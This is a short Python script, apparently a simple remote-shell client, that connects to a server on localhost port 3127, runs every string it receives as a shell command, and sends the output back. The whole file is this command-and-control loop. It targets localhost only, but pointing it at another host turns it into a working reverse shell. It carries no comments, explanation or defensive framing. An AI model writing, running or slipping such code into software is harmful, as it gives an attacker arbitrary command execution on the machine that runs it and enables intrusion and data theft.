import socket
import time
import subprocess



s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) 
port = 3127
s.connect(('localhost', port))
while True:
    try:
        output=s.recv(1024)
        print(output)
        proc=subprocess.Popen(output, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        runcommand=proc.stdout.read()+proc.stderr.read()
        print(runcommand)
        s.send(runcommand)
        # s.close()
        time.sleep(5)
    except socket.error:
       print("end of output from server") 
       break


